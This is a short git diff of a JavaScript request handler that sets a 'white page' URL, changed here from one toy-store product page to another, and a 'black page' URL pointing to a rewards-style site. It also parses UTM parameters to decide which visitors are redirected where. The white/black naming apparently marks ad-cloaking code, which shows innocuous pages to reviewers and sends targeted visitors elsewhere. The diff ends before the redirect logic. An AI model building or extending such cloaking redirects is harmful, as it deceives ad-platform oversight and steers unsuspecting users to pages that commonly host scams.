@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://plushiedepot.com/products/lifelike-plush-blue-whale";
+    const whitePageURL = "https://castleplanethk.com/products/pre-order-hkdl-grey-and-white-flerken-cat-squeeze-toy";
     const blackPageURL = "https://rwrds.live";
   
     // Parse the UTM parameters from the request URL
